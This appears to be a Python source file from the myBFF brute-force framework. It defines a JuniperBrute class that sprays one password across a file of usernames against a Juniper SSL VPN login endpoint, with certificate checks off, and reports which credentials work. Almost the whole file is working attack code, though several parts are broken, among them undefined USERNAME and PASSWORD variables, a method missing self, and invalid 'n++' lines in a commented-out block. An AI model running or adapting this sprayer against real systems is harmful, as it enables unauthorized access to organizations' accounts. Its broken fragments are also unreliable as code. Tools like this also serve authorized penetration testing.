#! /bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from requests import session
import requests
import re
from argparse import ArgumentParser

class JuniperBrute():
    ignore = ['tz_offset','btnSubmit']
#    def urlCheck():
#        print("[-] Checking for other logon pages...")
#        for n in [1, 100, 1]:
#            URL = 'url_' + n
#            u = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + 'welcome.cgi', allow_redirects=False, verify=False)
#            if '302' in u:
#                n = n++
#            else:
#                MFACheck(c, URL)
#                if MFACheck:
#                    n = n++
#                else:
#                    break
    def MFACheck(c, URL):
        print("[-] Checking to see if MultiFactor Authentication is required...")
        mfa = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + 'welcome.cgi', allow_redirects=False, verify=False)
        m = re.findall('<input id=(.*?)>', mfa.text, re.DOTALL)
        n = re.search('password2', m)
        if n:
            return True
        else:
            return False
    def connectTest(self, config, payload):
        with session() as c:
            cget = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/', data=payload, allow_redirects=True, verify=False)
            if cget.cookies:
                URL = cget.cookies['DSSIGNIN']
            else:
                URL = "url_default"
            print URL
            #Check for existence of a second factor MFACheck()
            #MFAused = MFACheck(c, URL)
            #if MFACheck() returns TRUE, run urlCheck()
            #if MFAused:
            #    urlCheck()
            cpost = c.post(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + 'login.cgi', data=payload, allow_redirects=False, verify=False)
            print cpost.text
            m = re.search('p=user-confirm', cpost.header)
            if m:
                print("[+]  User Credentials Successful: " + USERNAME + ":" + PASSWORD)
            else:
                print("[-]  Login Failed for: " + USERNAME + ":" + PASSWORD)
    def payload(self, config):
        if config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'tz_offset': '-360',
                    'username': config["USERNAME"],
                    'password': config["PASSWORD"],
                    'realm': 'Windows',
                    'btnSubmit': 'Sign+In'
                    }
                self.connectTest(config, payload)
        else:
            payload = {
                'tz_offset': '-360',
                'username': config["USERNAME"],
                'password': config["PASSWORD"],
                'realm': 'Windows',
                'btnSubmit': 'Sign+In'
            }
            self.connectTest(config, payload)
